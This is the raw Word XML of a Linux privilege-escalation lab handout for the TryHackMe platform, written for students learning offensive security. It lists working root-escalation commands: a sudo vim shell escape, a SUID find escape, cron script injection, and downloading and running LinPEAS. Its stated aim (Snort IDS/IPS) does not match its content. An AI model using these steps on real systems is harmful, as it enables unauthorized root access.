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8ED71" w14:textId="6779EB28" w:rsidR="00471647" w:rsidRPr="00160515" w:rsidRDefault="00471647" w:rsidP="0047164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60515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Lab Exercise </w:t>
      </w:r>
      <w:r w:rsidR="00610703" w:rsidRPr="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AAC005" w14:textId="4512F5C0" w:rsidR="00471647" w:rsidRPr="00160515" w:rsidRDefault="00610703" w:rsidP="00323B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160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Privilage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escalation in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TryHackMe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Platform</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B673466" w14:textId="243D6725" w:rsidR="00471647" w:rsidRPr="00160515" w:rsidRDefault="00471647" w:rsidP="00471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515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>AIM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1151EA59" w14:textId="77777777" w:rsidR="00471647" w:rsidRPr="00CC56FC" w:rsidRDefault="00471647" w:rsidP="00471647">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">To detect and prevent real-time network attacks using Snort IDS/IPS on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC56FC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CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D626F54" w14:textId="77777777" w:rsidR="00471647" w:rsidRPr="00160515" w:rsidRDefault="00471647" w:rsidP="00471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515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SOFTWARE REQUIRED:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4455E8D2" w14:textId="45B37955" w:rsidR="00471647" w:rsidRPr="00CC56FC" w:rsidRDefault="00471647" w:rsidP="00471647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CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> account, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>AttackBox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VPN,</w:t>
      </w:r>
      <w:r w:rsidR="00610703" w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E3D57F" w14:textId="6FE872BB" w:rsidR="00AA516E" w:rsidRPr="00160515" w:rsidRDefault="00AA516E" w:rsidP="0047164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60515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Explanation of Exercise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531130D9" w14:textId="269134DE" w:rsidR="00AA516E" w:rsidRPr="00CC56FC" w:rsidRDefault="00610703" w:rsidP="00471647">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Privilege escalation means gaining higher permissions on a system after initial access (usually from a low-privilege user to root/administrator). In </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TryHackMe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> labs, the goal is usually to escalate privileges and capture the root flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740370EC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1 – Login to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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TryHackMe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="431015CE" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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Open browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B215447" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52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Go to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AB1CD5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https://tryhackme.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477DE694" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC">
      <w:pPr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Login with your credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44039561" w14:textId="4E24B4D9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58868D5E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 – Open the Lab Room</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEA34E7" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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Click Learn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFC4F04" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54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Search for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D704923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Linux Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B280C9" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55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Open the room.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060353EC" w14:textId="49493C80" w:rsid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The room contains multiple tasks and instructions.</w:t>
      </w:r>
      <w:r w:rsidR="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Follow all tasks and learn what is privilege Escalation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3679EB" w14:textId="77777777" w:rsidR="00160515" w:rsidRPr="00160515" w:rsidRDefault="00160515" w:rsidP="00160515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>TryHackMe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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Privilege Escalation Flow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF02E60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>Gain initial shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722FD20B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>Run enumeration commands</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F99E08A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Check </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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-l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D47E161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 xml:space="preserve">Search </w:t>
      </w:r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>SUID binaries</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099E1883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 xml:space="preserve">Check </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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>cron</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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jobs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111F1E01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 xml:space="preserve">Look for </w:t>
      </w:r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>writable scripts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CEB99E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 xml:space="preserve">Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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>GTFOBins</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="22B3D783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 xml:space="preserve">Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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>LinPEAS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="685F92D5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>Exploit vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3590D1D7" w14:textId="77777777" w:rsidR="00160515" w:rsidRPr="00160515" w:rsidRDefault="00160515" w:rsidP="00160515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160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Get </w:t>
      </w:r>
      <w:r w:rsidRPr="00160515">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>root flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3952F183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Step 3 – Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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AttackBox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E0803EF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At the top of the room page click:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548BBD6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Start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AttackBox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0FED8FC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Wait 1–2 minutes until the Kali Linux desktop loads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B28996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AttackBox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is a browser-based penetration testing machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C8DC74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4 – Open Terminal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BE31B8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Inside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AttackBox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open the terminal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2886490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Method 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AD05BC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Click the Terminal icon in the bottom taskbar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C1D5D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Method 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61364D95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Press the shortcut</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4B4636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CTRL + ALT + T</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D18AD8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A terminal window will open.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51441F2C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5 – Identify Target Machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6CBA12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On the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room page locate the Target IP Address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2B0B46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15C41E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10.10.152.45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5889EA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lastRenderedPageBreak/>
        <w:t>This is the machine students will attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562AA742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6 – Connect to Target Machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5F77E0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Use SSH to connect.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1286B19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Command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545849F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ssh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username@target-ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5A1B8870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6D4E117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ssh tryhackme@10.10.152.45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670202AF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Press Enter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532DF3C7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When asked:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EDEAF7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Are you sure you want to continue connecting?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565BDF1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Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8B767D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yes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4D652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Then enter the password provided in the room instructions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562EC83C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If successful you will see:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC486A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tryhackme@</w:t>
      </w:r>
      <w:proofErr w:type="gram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target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:~</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6F95BC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This means you now have initial access to the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321984D8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7 – Verify Current User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180A2C76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Run the command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5958641C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whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F057DAF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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B3718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tryhackme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7F17F2E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This shows the current logged in user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CF83F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The goal is to escalate privileges to root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F7C934" w14:textId="77777777" w:rsidR="00160515" w:rsidRDefault="00160515" w:rsidP="00CC56F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5CCC36D1" w14:textId="027C2DDB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8 – Check User Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215FC8D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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A9B76D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id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EEB513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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A58A12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uid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=1001(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) gid=1001(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) groups=1001(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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AEAB3C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Shows user ID and group memberships.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718AB4A0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9 – Collect System Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714042FA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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49565D8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uname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-a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114F668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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1E0CE2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Linux ubuntu 4.4.0-21-generic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E115E3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Displays kernel version which may contain vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143BE342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Check operating system:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588A0C9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cat /etc/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os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-release</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43116D0C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Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9132B0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Ubuntu 16.04</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73524EC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Older OS versions may contain security flaws.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA3FDE2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10 – Check Sudo Permissions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4FAD7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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBE19C7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-l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EFAA9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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156FCDF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User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tryhackme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may run the following commands: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(root) NOPASSWD: /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/bin/vim</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3CC97A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User can run vim as root without password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E86F76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11 – Exploit Sudo Privilege</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2408EE8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Execute:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B2FFF8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vim -c </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>':!</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>/bin/bash'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F12818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Now check:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44009108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whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="64C8AA15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0131E118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root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7194F3B0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This command opens a root shell using vim.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41000420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12 – Search for SUID Binaries</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AB1B6A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If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sudo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access is not available, search for SUID files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1747788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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE82777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find / -perm -4000 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043ED833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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F8D971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/bin/find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/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/bin/passwd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/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/bin/python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABAB7BD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SUID binaries run with owner privileges (often root).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EC8D2B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13 – Exploit SUID Binary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF08702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If find is present run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4578302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C56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>find .</w:t>
      </w:r>
      <w:proofErr w:type="gram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-exec /bin/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sh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\; -quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDBBBC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Then check:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC0A8CD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whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="00188795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If successful:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48162111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root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E61B73F" w14:textId="77777777" w:rsidR="00160515" w:rsidRDefault="00160515" w:rsidP="00CC56FC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46A07A1C" w14:textId="4DE1E6D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Step 14 – Check Cron Jobs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1579503A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Cron jobs execute scheduled tasks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A07828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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D287859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cat /etc/crontab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549DC459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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43827840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* * * * * root /home/user/script.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4C1AF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The script runs every minute as root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2386E1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Check permissions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFA2161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ls -la /home/user/script.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DF768F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If writable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD40A24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nano /home/user/script.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D95D7C6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Add:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5883B8D2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/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50562DB9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When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cron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executes the script a root shell appears.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4768D889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15 – Check Writable Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C47DFF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Find writable files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C685C5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find / -writable -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AABBD11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Writable files may allow code injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74723D6B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16 – Check PATH Variable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAB3179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Display PATH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B95D5B0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echo $PATH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E33758A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 output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6730F63D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/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/local/bin:/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usr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/bin:/bin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C636A75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lastRenderedPageBreak/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If root executes commands without absolute path, attackers can hijack commands.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D99DC7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17 – Automated Enumeration Tool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14867EE3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Download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LinPEAS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.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BE88A9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wget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https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568D7CB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Make executable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF6FAC3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chmod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+x linpeas.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FEC2BC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Run the tool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D819378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./linpeas.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F032F19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LinPEAS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automatically detects:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28329705" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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SUID vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D8527D" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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Cron jobs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E15DAE" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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PATH misconfigurations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D38EA3" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56F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Password leaks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F13E66C" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC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Kernel exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042BF36B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18 – Kernel Exploit Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2525EF7E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Check kernel version:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B618147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uname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-r</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A945B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Search exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E4CE9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searchsploit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linux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 xml:space="preserve"> kernel &lt;version&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D6E893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Explanation</w:t>
      </w:r>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>Older kernels may contain privilege escalation vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7003C301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19 – Confirm Root Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5CEA15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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168D170D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r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3DBA0505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Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245F6C9B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lastRenderedPageBreak/>
        <w:t>root</w:t>
      </w:r>
    </w:p>
